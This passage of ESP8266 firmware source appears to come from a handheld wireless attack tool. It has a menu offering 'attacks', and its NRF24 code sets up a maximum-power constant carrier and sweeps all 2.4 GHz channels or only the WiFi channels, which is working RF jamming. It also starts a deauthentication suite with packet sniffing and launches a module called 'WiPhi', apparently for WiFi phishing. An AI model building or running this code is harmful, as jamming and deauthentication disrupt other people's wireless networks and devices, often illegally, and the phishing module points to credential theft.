    displayUI.drawString(0, "RF Hunter");
    displayUI.drawString(1, "NRF Error!");
    displayUI.drawString(3, "BACK main menu");
    displayUI.updateSuffix();
}

void drawNrfMenu() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "RF-Functions");
    displayUI.drawString(1, "Select Attack:");
    for (int i = 0; i < NRF_MODE_COUNT; i++) {
        String row = (i == nrfSelected ? "> " : "  ");
        row += NRF_MODES[i].label;
        displayUI.drawString(i + 2, row);
    }
    displayUI.updateSuffix();
}

void drawNrfRunning() {
    displayUI.updatePrefix();
    displayUI.drawString(0, "Running:");
    if (activeNrfMode >= 0) displayUI.drawString(1, NRF_MODES[activeNrfMode].label);
    displayUI.drawString(3, "BACK to stop");
    displayUI.drawString(4, "Hold BACK: menu");
    displayUI.updateSuffix();
}

bool setupNrfRadio() {
    if (nrfReady) return true;
    drawNrfBootScreen();
    if (!radio.begin()) { Serial.println("[ERROR] NRF24 init failed!"); drawNrfError(); return false; }
    radio.setAutoAck(false); radio.stopListening(); radio.setRetries(0,0);
    radio.setPayloadSize(5); radio.setAddressWidth(3); radio.setPALevel(RF24_PA_MAX);
    radio.setDataRate(RF24_2MBPS); radio.setCRCLength(RF24_CRC_DISABLED);
    nrfReady = true;
    displayUI.drawString(5, "NRF OK"); displayUI.updateSuffix(); delay(800);
    return true;
}

void startCarrier() {
    if (!carrierActive) { radio.powerUp(); delay(5); radio.startConstCarrier(RF24_PA_MAX, NRF_CARRIER_CH); carrierActive = true; }
}
void stopCarrier() {
    if (carrierActive) { radio.stopConstCarrier(); carrierActive = false; }
}

void startNrfMode(int idx) {
    if (idx < 0 || idx >= NRF_MODE_COUNT) return;
    activeNrfMode = idx;
    if (NRF_MODES[idx].needsCarrier) startCarrier();
    if (NRF_MODES[idx].init) NRF_MODES[idx].init();
    appMode = AppMode::NRF_RUNNING;
    drawNrfRunning();
}

void stopNrfMode() { stopCarrier(); activeNrfMode = -1; }

void startDeautherSuite() {
    if (!deautherStarted) {
        wifi::begin();
        wifi_set_promiscuous_rx_cb([](uint8_t* buf, uint16_t len) { scan.sniffer(buf, len); });
        names.load(); ssids.load(); cli.load(); scan.setup();
        if (settings::getCLISettings().enabled) cli.enable();
        else prntln(SETUP_SERIAL_WARNING);
        if (settings::getWebSettings().enabled) wifi::startAP();
        deautherStarted = true; booted = true;
        EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
    }
    appMode = AppMode::DEAUTHER_SUITE;
    displayUI.mode = DISPLAY_MODE::INTRO;
}

void returnToMainMenu() {
    if (appMode == AppMode::NRF_RUNNING) stopNrfMode();
    if (appMode == AppMode::DEAUTHER_SUITE) { attack.stop(); scan.stop(); }
    // WiPhi cleanup is done in wpExit() before calling returnToMainMenu()
    appMode = AppMode::MAIN_MENU;
    displayUI.mode = DISPLAY_MODE::OFF;
    mainSelected = 0; nrfSelected = 0;
    drawMainMenu();
}

void updateMainMenu() {
    updateButtons();
    if (!displayUI.upBtn) return;

    if (displayUI.upBtn->clicked()) {
        mainSelected = (mainSelected + MAIN_MENU_COUNT - 1) % MAIN_MENU_COUNT; drawMainMenu();
    } else if (displayUI.downBtn->clicked()) {
        mainSelected = (mainSelected + 1) % MAIN_MENU_COUNT; drawMainMenu();
    } else if (displayUI.enterBtn->clicked()) {
        if      (mainSelected == 0) { if (setupNrfRadio()) { appMode = AppMode::NRF_MENU; nrfSelected = 0; drawNrfMenu(); } }
        else if (mainSelected == 1) { startDeautherSuite(); }
        else                        { wpEnter(); }   // ← WiPhi
    }
}

void updateNrfMenu() {
    updateButtons();
    if (!displayUI.upBtn) return;
    if (displayUI.backHolding(5000)) { returnToMainMenu(); return; }
    if (displayUI.upBtn->clicked())    { nrfSelected = (nrfSelected + NRF_MODE_COUNT - 1) % NRF_MODE_COUNT; drawNrfMenu(); }
    else if (displayUI.downBtn->clicked()) { nrfSelected = (nrfSelected + 1) % NRF_MODE_COUNT; drawNrfMenu(); }
    else if (displayUI.enterBtn->clicked()) { startNrfMode(nrfSelected); }
    else if (displayUI.backBtn->clicked())  { returnToMainMenu(); }
}

void updateNrfRunning() {
    updateButtons();
    if (!displayUI.upBtn) return;
    if (displayUI.backHolding(5000)) { returnToMainMenu(); return; }
    if (displayUI.backBtn->clicked()) {
        stopNrfMode(); appMode = AppMode::NRF_MENU; nrfSelected = 0; drawNrfMenu(); return;
    }
    if (activeNrfMode >= 0 && NRF_MODES[activeNrfMode].tick) NRF_MODES[activeNrfMode].tick();
    static unsigned long lastDraw = 0;
    if (millis() - lastDraw > 1000UL) { drawNrfRunning(); lastDraw = millis(); }
}

void updateDeautherSuite() {
    wifi::update(); attack.update(); displayUI.update(); cli.update(); scan.update(); ssids.update();
    if (displayUI.backHolding(5000)) { returnToMainMenu(); return; }
    if (settings::getAutosaveSettings().enabled &&
        (currentTime - autosaveTime > settings::getAutosaveSettings().time)) {
        autosaveTime = currentTime;
        names.save(false); ssids.save(false); settings::save(false);
    }
}

// ============================================================
//  NRF attack implementations
// ============================================================
void nrfAttackAllInit()  {}
void nrfAttackAllTick()  { for (int ch = 0; ch < 125; ch++) radio.setChannel(ch); }
void nrfAttackWiFiInit() {}
void nrfAttackWiFiTick() { for (int i = 0; i < numWifiCh; i++) radio.setChannel(wifiChannels[i]); }

// ============================================================
//  setup()
// ============================================================
void setup() {
    randomSeed(os_random());
    Serial.begin(115200);
    Serial.println();

    prnt(SETUP_MOUNT_SPIFFS);
    LittleFS.begin();
    prntln(SETUP_OK);

    // EEPROM — size must cover both deauther region AND WiPhi region
    EEPROMHelper::begin(max((int)EEPROM_SIZE, WP_EE_TOTAL));

    // Init WiPhi EEPROM region on first boot
    if (EEPROM.read(WP_EE_MAGIC_ADDR) != WP_EE_MAGIC) {
        EEPROM.write(WP_EE_MAGIC_ADDR, WP_EE_MAGIC);
        for (int i = 0; i < WP_EE_SLOTS; i++) wpEeDelete(i);
        EEPROM.commit();
    }

#ifdef FORMAT_SPIFFS
    prnt(SETUP_FORMAT_SPIFFS); LittleFS.format(); prntln(SETUP_OK);
#endif
#ifdef FORMAT_EEPROM
    prnt(SETUP_FORMAT_EEPROM); EEPROMHelper::format(EEPROM_SIZE); prntln(SETUP_OK);
#endif

    if (!EEPROMHelper::checkBootNum(BOOT_COUNTER_ADDR)) {
        prnt(SETUP_FORMAT_SPIFFS); LittleFS.format(); prntln(SETUP_OK);
        prnt(SETUP_FORMAT_EEPROM); EEPROMHelper::format(EEPROM_SIZE); prntln(SETUP_OK);
        EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
    }

    currentTime = millis();

#ifndef RESET_SETTINGS
    settings::load();
#else
    settings::reset(); settings::save();
#endif

    if (settings::getDisplaySettings().enabled) {
        displayUI.setup();
        displayUI.mode = DISPLAY_MODE::OFF;
        drawMainMenu();
    }

    prntln(SETUP_STARTED);
    prntln(DEAUTHER_VERSION);
}

// ============================================================
//  loop()
// ============================================================
void loop() {
    currentTime = millis();

    switch (appMode) {
        case AppMode::MAIN_MENU:       updateMainMenu();       break;
        case AppMode::NRF_MENU:        updateNrfMenu();        break;
        case AppMode::NRF_RUNNING:     updateNrfRunning();     break;
        case AppMode::DEAUTHER_SUITE:  updateDeautherSuite();  break;
        case AppMode::WIPHI:           updateWiPhi();          break;
    }
}
